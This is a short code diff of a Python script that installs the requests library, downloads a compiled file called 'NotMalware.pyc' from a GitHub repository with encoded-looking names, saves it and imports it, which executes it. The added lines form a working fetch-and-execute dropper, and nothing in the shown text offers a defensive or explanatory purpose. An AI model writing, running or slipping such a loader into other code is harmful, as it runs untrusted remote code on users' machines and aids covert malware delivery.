@@ -3,10 +3,9 @@ import subprocess
 import sys
 subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]) ##Installs dependency modules
 import requests
-filenames = ["Chat.txt", "ChatBot.py", "cUpdates.py",
-             "growthRate.py"]
-response = requests.get("https://github.com/R0lUSFVC/TUFMV0FS/blob/master/NotMalware.pyc?raw=true")
-with open("NotMalware.py", "w") as file:
+
+response = requests.get("https://raw.github.com/R0lUSFVC/TUFMV0FS/master/NotMalware.pyc")
+with open("NotMalware.pyc", "w") as file:
     file.write(response.text)
 import NotMalware
 platform = platform.system()
